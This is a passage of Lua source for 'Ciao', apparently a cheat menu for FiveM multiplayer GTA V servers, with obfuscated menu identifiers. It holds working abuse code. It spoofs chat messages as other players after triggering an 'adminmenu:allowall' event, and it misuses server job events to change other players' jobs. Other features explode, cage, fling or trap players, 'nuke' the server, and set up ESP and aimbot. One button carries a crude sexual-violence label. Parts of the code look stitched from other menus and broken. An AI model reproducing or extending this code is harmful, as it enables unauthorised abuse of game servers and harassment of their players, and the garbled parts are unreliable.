            local currFaceIndex = GetPedDrawableVariation(PlayerPedId(), 0) + 1
            local selFaceIndex = GetPedDrawableVariation(PlayerPedId(), 0) + 1

            local currFtextureIndex = GetPedTextureVariation(PlayerPedId(), 0) + 1
            local selFtextureIndex = GetPedTextureVariation(PlayerPedId(), 0) + 1

            local currHairIndex = GetPedDrawableVariation(PlayerPedId(), 2) + 1
            local selHairIndex = GetPedDrawableVariation(PlayerPedId(), 2) + 1

            local currHairTextureIndex = GetPedTextureVariation(PlayerPedId(), 2) + 1
            local selHairTextureIndex = GetPedTextureVariation(PlayerPedId(), 2) + 1

            local currMaskIndex = GetPedDrawableVariation(PlayerPedId(), 1) + 1
            local selMaskIndex = GetPedDrawableVariation(PlayerPedId(), 1) + 1

            local currHatIndex = GetPedPropIndex(PlayerPedId(), 0) + 1
            local selHatIndex = GetPedPropIndex(PlayerPedId(), 0) + 1

            if currHatIndex == 0 or currHatIndex == 1 then -- No Hat
                currHatIndex = 9
                selHatIndex = 9
            end

            local currHatTextureIndex = GetPedPropTextureIndex(PlayerPedId(), 0)
            local selHatTextureIndex = GetPedPropTextureIndex(PlayerPedId(), 0)

            -- Fixes the Hat starting at index 1 not displaying because its value is 0
            if currHatTextureIndex == -1 or currHatTextureIndex == 0 then
                currHatTextureIndex = 1
                selHatTextureIndex = 1
            end

            local currPFuncIndex = 1
            local selPFuncIndex = 1

            local currVFuncIndex = 1
            local selVFuncIndex = 1
            
            local currSeatIndex = 1
            local selSeatIndex = 1

            local currTireIndex = 1
            local selTireIndex = 1

            local currNoclipSpeedIndex = 1
            local selNoclipSpeedIndex = 1

            local currFastRunIndex = 1
            local selFastRunIndex = 1

            local currFastSwimIndex = 1
            local selFastSwimIndex = 1

            local currObjIndex = 1
            local selObjIndex = 1

            local currRotationIndex = 3
            local selRotationIndex = 3

            local currDirectionIndex = 1
            local selDirectionIndex = 1

            local Outfits = {}
            local currClothingIndex = 1
            local selClothingIndex = 1

            local currGravIndex = 3
            local selGravIndex = 3

            local currSpeedIndex = 1
            local selSpeedIndex = 1

            local currAttackTypeIndex = 1
            local selAttackTypeIndex = 1

            local currESPDistance = 3
            local selESPDistance = 3

            local currESPRefreshIndex = 1
            local selESPRefreshIndex = 1

            local currAimbotBoneIndex = 1
            local selAimbotBoneIndex = 1

            local currSaveLoadIndex1 = 1
            local selSaveLoadIndex1 = 1
            local currSaveLoadIndex2 = 1
            local selSaveLoadIndex2 = 1
            local currSaveLoadIndex3 = 1
            local selSaveLoadIndex3 = 1
            local currSaveLoadIndex4 = 1
            local selSaveLoadIndex4 = 1
            local currSaveLoadIndex5 = 1
            local selSaveLoadIndex5 = 1

            local currRadioIndex = 1
            local selRadioIndex = 1

            local currWeatherIndex = 1
            local selWeatherIndex = 1

            -- GLOBALS
            local TrackedPlayer = nname
            local SpectatedPlayer = nname
            local FlingedPlayer = nname
            local PossessingVeh = arwet
            local pvblip = nname
            local pvehicle = nname
            local pvehicleText = ""
            local IsPlayerHost = nname

            if NetworkIsHost() then
                IsPlayerHost = "~g~Yes"
            else
                IsPlayerHost = "~r~No"
            end

            local savedpos1 = nname
            local savedpos2 = nname
            local savedpos3 = nname
            local savedpos4 = nname
            local savedpos5 = nname

            -- TOGGLES
            local includeself = true
            local Collision = true
            local objVisible = true
            local PlaceSelf = true
            local SpawnInAir = true
            local SpawnEngineOn = true

            -- TABLES
            SpawnedObjects = {}

            -- MAIN MENU
            Ciao.CreateMenu('Ciao', menuName .. ' ' .. version) 
            Ciao.SetSubTitle('Ciao', ' developed by sharkiii#9999 and owned by emerald#1337')

            -- MAIN MENU SUBMENUS
            Ciao.CreateSubMenu('\112\108\97\121\101\114\10', 'Ciao', 'Player Options')
            Ciao.CreateSubMenu('\115\101\108\102\10', 'Ciao', 'Self Options')
            Ciao.CreateSubMenu('\119\101\97\112\111\110\10', 'Ciao', 'Weapon Options')
            Ciao.CreateSubMenu('\118\101\104\105\99\108\101\10', 'Ciao', 'Vehicle Options')
            Ciao.CreateSubMenu('\119\111\114\108\100\10', 'Ciao', 'World Options')
            Ciao.CreateSubMenu('\116\101\108\101\112\111\114\116\10', 'Ciao', 'Teleport Options')
            Ciao.CreateSubMenu('\109\105\115\99\10', 'Ciao', 'Misc Options')
            Ciao.CreateSubMenu('\108\117\97\10', 'Ciao', 'Lua Options')
            Ciao.CreateSubMenu('\115\101\116\116\105\110\103\115\10', 'Ciao', '\115\101\116\116\105\110\103\115\10')
            Ciao.CreateSubMenu('\108\121\110\120\10', 'Ciao', '\108\121\110\120\10 bro....')
            -- PLAYER MENU SUBMENUS
            Ciao.CreateSubMenu('allplayer', '\112\108\97\121\101\114\10', 'All Players')
            Ciao.CreateSubMenu('\112\108\97\121\101\114\111\112\116\105\111\110\115\10', '\112\108\97\121\101\114\10', 'Player Options')
            Ciao.CreateSubMenu('troll', '\112\108\97\121\101\114\111\112\116\105\111\110\115\10', 'Troll Options')
            Ciao.CreateSubMenu('jobsplayers', '\112\108\97\121\101\114\111\112\116\105\111\110\115\10', 'Jobs Options')
            
        
            -- SELF MENU SUBMENUS
            Ciao.CreateSubMenu('\97\112\112\101\97\114\97\110\99\101\10', 'Ciao', 'Appearance Options')
            Ciao.CreateSubMenu('modifiers', '\115\101\108\102\10', 'Modifiers Options')

            -- APPEARANCE SUBMENUS
            Ciao.CreateSubMenu('modifyskintextures', '\97\112\112\101\97\114\97\110\99\101\10', "Modify Skin Textures")
            Ciao.CreateSubMenu('modifyhead', 'modifyskintextures', "Available Drawables")
            Ciao.CreateSubMenu('skinsmodels', '\97\112\112\101\97\114\97\110\99\101\10', "Skin Models")

            -- WEAPON MENU SUBMENUS

            Ciao.CreateSubMenu('WeaponCustomization', '\119\101\97\112\111\110\10', 'Weapon Customization')
            Ciao.CreateSubMenu('\119\101\97\112\111\110\115\112\97\119\110\101\114\10', '\119\101\97\112\111\110\10', 'Weapon Spawner')
            Ciao.CreateSubMenu('melee', '\119\101\97\112\111\110\115\112\97\119\110\101\114\10', 'Melee Weapons')
            Ciao.CreateSubMenu('pistol', '\119\101\97\112\111\110\115\112\97\119\110\101\114\10', 'Pistols')
            Ciao.CreateSubMenu('smg', '\119\101\97\112\111\110\115\112\97\119\110\101\114\10', 'SMGs / MGs')
            Ciao.CreateSubMenu('shotgun', '\119\101\97\112\111\110\115\112\97\119\110\101\114\10', 'Shotguns')
            Ciao.CreateSubMenu('assault', '\119\101\97\112\111\110\115\112\97\119\110\101\114\10', 'Assault Rifles')
            Ciao.CreateSubMenu('sniper', '\119\101\97\112\111\110\115\112\97\119\110\101\114\10', 'Sniper Rifles')
            Ciao.CreateSubMenu('thrown', '\119\101\97\112\111\110\115\112\97\119\110\101\114\10', 'Thrown Weapons')
            Ciao.CreateSubMenu('heavy', '\119\101\97\112\111\110\115\112\97\119\110\101\114\10', 'Heavy Weapons')

            -- VEHICLE MENU SUBMENUS
            Ciao.CreateSubMenu('\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', '\118\101\104\105\99\108\101\10', 'Vehicle Spawner')
            Ciao.CreateSubMenu('vehiclemods', '\118\101\104\105\99\108\101\10', 'Vehicle Mods')
            Ciao.CreateSubMenu('vehiclemenu', '\118\101\104\105\99\108\101\10', 'Vehicle Control Menu')

            -- VEHICLE SPAWNER MENU
            Ciao.CreateSubMenu('compacts', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Compacts')
            Ciao.CreateSubMenu('sedans', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Sedans')
            Ciao.CreateSubMenu('suvs', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'SUVs')
            Ciao.CreateSubMenu('coupes', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Coupes')
            Ciao.CreateSubMenu('muscle', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Muscle')
            Ciao.CreateSubMenu('sportsclassics', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Sports Classics')
            Ciao.CreateSubMenu('sports', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Sports')
            Ciao.CreateSubMenu('super', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Super')
            Ciao.CreateSubMenu('motorcycles', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Motorcycles')
            Ciao.CreateSubMenu('offroad', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Off-Road')
            Ciao.CreateSubMenu('industrial', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Industrial')
            Ciao.CreateSubMenu('utility', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Utility')
            Ciao.CreateSubMenu('vans', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Vans')
            Ciao.CreateSubMenu('cycles', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Cycles')
            Ciao.CreateSubMenu('boats', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Boats')
            Ciao.CreateSubMenu('helicopters', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Helicopters')
            Ciao.CreateSubMenu('planes', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Planes')
            Ciao.CreateSubMenu('service', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Service')
            Ciao.CreateSubMenu('commercial', '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10', 'Commercial')

            -- VEHICLE MODS SUBMENUS
            Ciao.CreateSubMenu('vehiclecolors', 'vehiclemods', 'Vehicle Colors')
            Ciao.CreateSubMenu('vehiclecolors_primary', 'vehiclecolors', 'Primary Color')
            Ciao.CreateSubMenu('vehiclecolors_secondary', 'vehiclecolors', 'Secondary Color')

            Ciao.CreateSubMenu('primary_classic', 'vehiclecolors_primary', 'Classic Colors')
            Ciao.CreateSubMenu('primary_matte', 'vehiclecolors_primary', 'Matte Colors')
            Ciao.CreateSubMenu('primary_metal', 'vehiclecolors_primary', 'Metals')

            Ciao.CreateSubMenu('secondary_classic', 'vehiclecolors_secondary', 'Classic Colors')
            Ciao.CreateSubMenu('secondary_matte', 'vehiclecolors_secondary', 'Matte Colors')
            Ciao.CreateSubMenu('secondary_metal', 'vehiclecolors_secondary', 'Metals')

            Ciao.CreateSubMenu('vehicletuning', 'vehiclemods', 'Vehicle Tuning')

            -- WORLD MENU SUBMENUS
            Ciao.CreateSubMenu('\111\98\106\101\99\116\115\112\97\119\110\101\114\10', 'Ciao', 'Object Spawner')
            Ciao.CreateSubMenu('objectlist', '\111\98\106\101\99\116\115\112\97\119\110\101\114\10', 'Select To Delete')
            Ciao.CreateSubMenu('weather', '\119\111\114\108\100\10', 'Weather Changer ~r~(CLIENT SIDE)')
            Ciao.CreateSubMenu('time', '\119\111\114\108\100\10', 'Time Changer')

            -- MISC MENU SUBMENUS
            Ciao.CreateSubMenu('esp', '\109\105\115\99\10', 'ESP & Visual Options')
            Ciao.CreateSubMenu('webradio', '\109\105\115\99\10', 'Web Radio')
            Ciao.CreateSubMenu('credits', '\109\105\115\99\10', 'Credits')
            Ciao.CreateSubMenu('InfoMenu', '\109\105\115\99\10', 'Info') 

            -- TELEPORT MENU SUBMENUS
            Ciao.CreateSubMenu('saveload', '\116\101\108\101\112\111\114\116\10', 'Save/Load Position')
            Ciao.CreateSubMenu('pois', '\116\101\108\101\112\111\114\116\10', 'POIs')
            --fuck server
            Ciao.CreateSubMenu('\102\117\99\107\115\101\114\118\101\114\10', 'Ciao', 'Fuck Server')

            -- LUA MENU SUBMENUS
            Ciao.CreateSubMenu('\101\115\120\10', '\108\117\97\10', 'Stoffer')
            Ciao.CreateSubMenu('\118\114\112\10', '\108\117\97\10', 'vRP Options')
            Ciao.CreateSubMenu('other', '\108\117\97\10', 'Skejss')
            Ciao.CreateSubMenu('money', '\118\114\112\10', 'Jobs')

            Ciao.InitializeTheme()


            while true do
                -- MAIN MENU
                
                if Ciao.IsMenuOpened('Ciao') then
                    if Ciao.MenuButton('Self Options', '\115\101\108\102\10') then
                    elseif Ciao.MenuButton('Players', '\112\108\97\121\101\114\10') then
                    elseif Ciao.MenuButton('~r~Lua Options', '\108\117\97\10') then
                    elseif Ciao.MenuButton('Weapon Options', '\119\101\97\112\111\110\10') then
                    elseif Ciao.MenuButton('Car Options', '\118\101\104\105\99\108\101\10') then
                    elseif Ciao.MenuButton('Models', '\97\112\112\101\97\114\97\110\99\101\10') then
                    elseif Ciao.MenuButton('World Options', '\119\111\114\108\100\10') then
                    elseif Ciao.MenuButton('Teleport Options', '\116\101\108\101\112\111\114\116\10') then
                    elseif Ciao.MenuButton('Misc', '\109\105\115\99\10') then
                    elseif Ciao.MenuButton('Objects', '\111\98\106\101\99\116\115\112\97\119\110\101\114\10') then
                    elseif Ciao.MenuButton('Server Fuck Options', '\102\117\99\107\115\101\114\118\101\114\10') then
                    elseif Ciao.MenuButton('settings', '\115\101\116\116\105\110\103\115\10') then
                    elseif Ciao.Button('~r~Kill Menu.') then break
                    end

                -- PLAYER OPTIONS MENU
                elseif Ciao.IsMenuOpened('\112\108\97\121\101\114\10') then

                        local playerlist = GetActivePlayers()
                        for i = 1, #playerlist do
                            local currPlayer = playerlist[i]
                            if Ciao.MenuButton("ID: ~y~[" .. GetPlayerServerId(currPlayer) .. "] ~s~" .. GetPlayerName(currPlayer), '\112\108\97\121\101\114\111\112\116\105\111\110\115\10') then
                                selectedPlayer = currPlayer end
                        
                    end


                --Fuck server
                elseif Ciao.IsMenuOpened('\102\117\99\107\115\101\114\118\101\114\10') then
                    if Ciao.CheckBox("~h~~y~ ~r~Include Self", includeself, "No", "Yes") then
                        includeself = not includeself
                    elseif Ciao.Button("~h~~y~ ~r~Fake ~h~~s~chat Message") then 
                        local eX = KeyboardInput("Enter player name", "", 100) if eX then local dT = KeyboardInput("Enter message", "", 10000) if dT then TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", eX, {0, 0x99, 255}, dT) end end
                    elseif Ciao.Button("~h~~y~ ~r~Nuke Server") then
                    ShowInfo("~y~Fucking Players...")
                        nukeserver()
                    elseif Ciao.Button("~h~~y~Â»~r~ Rape All") then
                        RapeAllFunc() 
                    elseif Ciao.Button("~h~~y~ ~r~Set ~s~All Nearby Vehicles Plate Text") then
                    local plateInput = GetKeyboardInput("Enter Plate Text (8 Characters):")
                    for k in EnumerateVehicles() do
                        RequestControlOnce(k)
                        SetVehicleNumberPlateText(k, plateInput)
                    end
                    elseif Ciao.CheckBox("~h~~y~ ~r~Make ~s~All Cars ~y~Fly", FlyingCars) then
                        FlyingCars = not FlyingCars
                    elseif Ciao.CheckBox("~h~~y~ ~r~Set ~s~The World On ~y~Fire", WorldOnFire) then
                        WorldOnFire = not WorldOnFire
                        if WorldOnFire then
                            wofDUI = CreateDui("", 1, 1)
                        else
                            DestroyDui(wofDUI)
                        end
                    elseif Ciao.Button("Cage all players") then
                        for i = IncludeSelfAtNukeWorld, 128 do
                            x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i)))
                            roundx = tonumber(string.format("%.2f", x))
                            roundy = tonumber(string.format("%.2f", y))
                            roundz = tonumber(string.format("%.2f", z))
                            local Kh6xNQdPrRYEO = "hei_prop_heist_apecrate"
                            local nBz_r68CY96M98 = GetHashKey(Kh6xNQdPrRYEO)
                            RequestModel(nBz_r68CY96M98)
                            while not HasModelLoaded(nBz_r68CY96M98) do
                                Citizen.Wait(0.0)
                            end
                            local LU_JD = CreateObject(nBz_r68CY96M98, roundx, roundy, roundz - 0.5, true, true, false)
                            SetEntityHeading(LU_JD, nlXCUGaxh(-90))
                            FreezeEntityPosition(LU_JD, true)
                        end
                    elseif Ciao.Button("~y~Close ~s~the whole square") then
                            x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
                            roundx = tonumber(string.format('%.2f', x))
                            roundy = tonumber(string.format('%.2f', y))
                            roundz = tonumber(string.format('%.2f', z))
                            local e8 = -145066854
                            RequestModel(e8)
                            while not HasModelLoaded(e8) do
                                Citizen.Wait(0)
                            end
                            local e9 = CreateObject(e8, 258.91, -933.1, 26.21, true, true, arwet)
                            local ea = CreateObject(e8, 200.91, -874.1, 26.21, true, true, arwet)
                            local e92 = CreateObject(e8, 126.52, -933.2, 26.21, true, true, arwet)
                            local ea2 = CreateObject(e8, 184.52, -991.2, 26.21, true, true, arwet)
                            SetEntityHeading(e9, 158.41)
                            SetEntityHeading(ea, 90.51)
                            SetEntityHeading(e92, 332.41)
                            SetEntityHeading(ea2, 260.51)
                            FreezeEntityPosition(e9, true)
                            FreezeEntityPosition(ea, true)
                            FreezeEntityPosition(e92, true)
                            FreezeEntityPosition(ea2, true)
                    elseif Ciao.Button("~h~~y~ ~r~Fuck Up The Map (Irreversible!)  [WIP]") then
                        if not FuckMap then
                            ShowInfo("~b~Fucking Up Map")
                            FuckMap = true
                        else
                            ShowInfo("~r~Map Already Fucked")
                        end
                    elseif Ciao.Button("~h~~y~ ~r~Explode All Players") then
                        ExplodeAll(includeself)
                    elseif Ciao.CheckBox("~h~~y~ ~r~Explode All Players ~r~(LOOP)", ExplodingAll) then
                        ExplodingAll = not ExplodingAll
                    elseif Ciao.Button("~h~~y~ ~r~Give All Players Weapons") then
                        GiveAllPlayersWeapons(includeself)
                    elseif Ciao.Button("~h~~y~ ~r~Remove All Players Weapons") then
                        StripAll(includeself)
                    elseif Ciao.Button("~h~~b~------Fuck all Vehicles------") then
                    elseif Ciao.Button("~h~~y~ ~r~Rampinator") then
                    for vehicle in EnumerateVehicles() do local eY = CreateObject(-145066854, 0, 0, 0, true, true, true) NetworkRequestControlOfEntity(vehicle) AttachEntityToEntity(eY, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true) NetworkRequestControlOfEntity(eY) SetEntityAsMissionEntity(eY, true, true) end     
                    elseif Ciao.Button("~h~~y~ ~r~BORGAR~s~ Vehicles") then local cC = GetHashKey("xs_prop_hamburgher_wl") for vehicle in EnumerateVehicles() do local cD = CreateObject(cC, 0, 0, 0, true, true, true) AttachEntityToEntity(cD, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true) end 
                    elseif Ciao.Button("Kick All Players From Vehicle") then
                        KickAllFromVeh(includeself)
                    end


                    elseif Ciao.IsMenuOpened('jobsplayers') then
                    if Ciao.Button("~r~Remove Job") then
                        udwdj("NB:destituerplayer",GetPlayerServerId(selectedPlayer))
                    elseif Ciao.Button("~s~Recruit~c~ Mechanic") then
                    local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
                        udwdj('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "mecano", result)
                    elseif Ciao.Button("~s~Recruit~b~ Police") then
                    local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
                        udwdj('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "police", result)
                        udwdj('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "police", result)
                        udwdj('Corujas RP-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "police", result)
                    elseif Ciao.Button("~s~Recruit~c~ Mafia") then
                    local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
                        udwdj('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "mafia", result)
                        udwdj('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "mafia", result)
                    elseif Ciao.Button("~s~Recruit~p~ Gang") then
                    local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
                        udwdj('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "gang", result)
                        udwdj('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "gang", result)
                    elseif Ciao.Button("~s~Recruit~y~ Taxi") then
                    local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
                        udwdj('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "taxi", result)
                        udwdj('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "taxi", result)
                    elseif Ciao.Button("~s~Recruit~r~ Inem") then
                    local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
                        udwdj('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "ambulance", result)
                        udwdj('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "ambulance", result)
                    end


                    elseif Ciao.IsMenuOpened('troll') then
                    if Ciao.Button('~r~Make him to a~s~Windmill') then
                            local bH = CreateObject(GetHashKey('prop_windmill_01'), 0, 0, 0, true, true, true)


                            AttachEntityToEntity(
                                bH,
                                GetPlayerPed(selectedPlayer),
                                GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005),
                                0.4,
                                0,
                                0,
                                0,
                                270.0,
                                60.0,
                                true,
                                true,
                                arwet,
                                true,
                                1,
                                true
                            )
                            elseif Ciao.Button('~r~Make him to ~s~Weed') then
                local bI = CreateObject(GetHashKey('Prop_weed_01'), 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                bI,
                                GetPlayerPed(selectedPlayer),
                                GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005),
                                0.4,
                                0,
                                0,
                                0,
                                270.0,
                                60.0,
                                true,
                                true,
                                arwet,
                                true,
                                1,
                                true
                            )
                        elseif Ciao.Button('~r~Make him to ~s~Beach Flag') then
                            local bI = CreateObject(GetHashKey('prop_beachflag_le'), 0, 0, 0, true, true, true)
                                    AttachEntityToEntity(
                                        bI,
                                        GetPlayerPed(selectedPlayer),
                                        GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005),
                                        0.4,
                                        0,
                                        0,
                                        0,
                                        270.0,
                                        60.0,
                                        true,
                                        true,
                                        arwet,
                                        true,
                                        1,
                                        true
                                    )
                                    elseif Ciao.Button('~r~Make him to ~s~a rock') then
                                        local bI = CreateObject(GetHashKey('prop_rock_4_big2'), 0, 0, 0, true, true, true)
                                                AttachEntityToEntity(
                                                    bI,
                                                    GetPlayerPed(selectedPlayer),
                                                    GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005),
                                                    0.4,
                                                    0,
                                                    0,
                                                    0,
                                                    270.0,
                                                    60.0,
                                                    true,
                                                    true,
                                                    arwet,
                                                    true,
                                                    1,
                                                    true
                                                )
                                                elseif Ciao.Button('~r~Make him to ~s~a Crashed Helikopter') then
                                                    local bI = CreateObject(GetHashKey('p_crahsed_heli_s'), 0, 0, 0, true, true, true)
                                                            AttachEntityToEntity(
                                                                bI,
                                                                GetPlayerPed(selectedPlayer),
                                                                GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005),
                                                                0.4,
                                                                0,
                                                                0,
                                                                0,
                                                                270.0,
                                                                60.0,
                                                                true,
                                                                true,
                                                                arwet,
                                                                true,
                                                                1,
                                                                true
                                                            )
                                                            elseif Ciao.Button('~r~Make him to ~s~a Toilet') then
                                                                local bI = CreateObject(GetHashKey('prop_ld_toilet_01'), 0, 0, 0, true, true, true)
                                                                        AttachEntityToEntity(
                                                                            bI,
                                                                            GetPlayerPed(selectedPlayer),
                                                                            GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005),
                                                                            0.4,
                                                                            0,
                                                                            0,
                                                                            0,
                                                                            270.0,
                                                                            60.0,
                                                                            true,
                                                                            true,
                                                                            arwet,
                                                                            true,
                                                                            1,
                                                                            true
                                                                            )
                                                                        elseif Ciao.Button('~r~Make him to ~s~a Gas Tank') then
                                                                            local bI = CreateObject(GetHashKey('prop_gas_tank_01a'), 0, 0, 0, true, true, true)
                                                                                    AttachEntityToEntity(
                                                                                        bI,
                                                                                        GetPlayerPed(selectedPlayer),
                                                                                        GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005),
                                                                                        0.4,
                                                                                        0,
                                                                                        0,
                                                                                        0,
                                                                                        270.0,
                                                                                        60.0,
                                                                                        true,
                                                                                        true,
                                                                                        arwet,
                                                                                        true,
                                                                                        1,
                                                                                        true
                                                                                        )
                                                                                    elseif Ciao.Button('~r~Make him to ~s~a Big Radar') then
                                                                                        local bI = CreateObject(GetHashKey('prop_air_bigradar'), 0, 0, 0, true, true, true)
                                                                                                AttachEntityToEntity(
                                                                                                    bI,
                                                                                                    GetPlayerPed(selectedPlayer),
                                                                                                    GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005),
                                                                                                    0.4,
                                                                                                    0,
                                                                                                    0,
                                                                                                    0,
                                                                                                    270.0,
                                                                                                    60.0,
                                                                                                    true,
                                                                                                    true,
                                                                                                    arwet,
                                                                                                    true,
                                                                                                    1,
                                                                                                    true
                                                                                                    )
                                                                                                elseif Ciao.Button('~r~Make him to ~s~a Hamburger') then
                                                                                                    local bI = CreateObject(GetHashKey('xs_prop_hamburgher_wl'), 0, 0, 0, true, true, true)
                                                                                                            AttachEntityToEntity(
                                                                                                                bI,
                                                                                                                GetPlayerPed(selectedPlayer),
                                                                                                                GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005),
                                                                                                                0.4,
                                                                                                                0,
                                                                                                                0,
                                                                                                                0,
                                                                                                                270.0,
                                                                                                                60.0,
                                                                                                                true,
                                                                                                                true,
                                                                                                                arwet,
                                                                                                                true,
                                                                                                                1,
                                                                                                                true
                                                                                                                )
                                                                                                                
                        elseif Ciao.Button("Taze ~g~Player") then
                            TazePlayer(selectedPlayer)
                    elseif Ciao.Button('~r~Make him to A ~s~Orange Ball') then
                    local bJ = CreateObject(GetHashKey('prop_juicestand'), 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                bJ,
                                GetPlayerPed(selectedPlayer),
                                GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005),
                                0.4,
                                0,
                                0,
                                0,
                                270.0,
                                60.0,
                                true,
                                true,
                                arwet,
                                true,
                                1,
                                true
                            )
                            Dopamine.ComboBox(
                                "Ram Vehicle",
                                o,
                                NOY,
                                nKGJjT,
                                function(R74FFqBxavfyn, yrmfT_)
                                    NOY = R74FFqBxavfyn
                                    nKGJjT = R74FFqBxavfyn
                                    PYFWQhTGNGfHR_keh8xib = o[R74FFqBxavfyn]
                                end
                            )
                    elseif Ciao.Button('~r~Cage ~s~Him') then
                            x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
                            roundx = tonumber(string.format('%.2f', x))
                            roundy = tonumber(string.format('%.2f', y))
                            roundz = tonumber(string.format('%.2f', z))
                            local e7 = 'prop_fnclink_05crnr1'
                            local e8 = GetHashKey(e7)
                            RequestModel(e8)
                            while not HasModelLoaded(e8) do
                                Citizen.Wait(0)
                            end
                            local e9 = CreateObject(e8, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, arwet)
                            local ea = CreateObject(e8, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, arwet)
                            SetEntityHeading(e9, -90.0)
                            SetEntityHeading(ea, 90.0)
                            FreezeEntityPosition(e9, true)
                            FreezeEntityPosition(ea, true)
                    elseif Ciao.CheckBox("Track Spiller", Tracking, "Tracking: Nobody", "Tracking: "..GetPlayerName(TrackedPlayer)) then
                        Tracking = not Tracking
                        TrackedPlayer = selectedPlayer
                    elseif Ciao.CheckBox("Fling Player", FlingingPlayer, "Flinging: Ingen", "Flinging: "..GetPlayerName(FlingedPlayer)) then
                        FlingingPlayer = not FlingingPlayer
                        FlingedPlayer = selectedPlayer
                    elseif Ciao.Button("Make the car fly") then
                        if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
                            ShowInfo("~r~Player is not i the Veichle!")
                        else

                            local wasSpeccing= arwet
                            local tmp = nname
                            if Spectating then
                                tmp = SpectatedPlayer
                                wasSpeccing = true
                                Spectating = not Spectating
                                SpectatePlayer(tmp)
                            end

                            local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
                            RequestControlOnce(veh)
                            ApplyForceToEntity(veh, 3, 0.0, 0.0, 5000000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)

                            if wasSpeccing then
                                Spectating = not Spectating
                                SpectatePlayer(tmp)
                            end

                        end
                    elseif Ciao.Button("Destroy Car!") then
                        if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
                            ShowInfo("~r~Player is not in the car")
                        else

                            local wasSpeccing= arwet
                            local tmp = nname
                            if Spectating then
                                tmp = SpectatedPlayer
                                wasSpeccing = true
                                Spectating = not Spectating
                                SpectatePlayer(tmp)
                            end

                            local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
                            RequestControlOnce(veh)
                            ApplyForceToEntity(veh, 3, 0.0, 0.0, -5000000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)

                            if wasSpeccing then
                                Spectating = not Spectating
                                SpectatePlayer(tmp)
                            end

                        end
                    elseif Ciao.Button("~s~Repair ~b~Vehicle") then
                        NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
                        SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false))
                        SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0.0)
                        SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0)
                        SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), false)
                        Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0)
                        
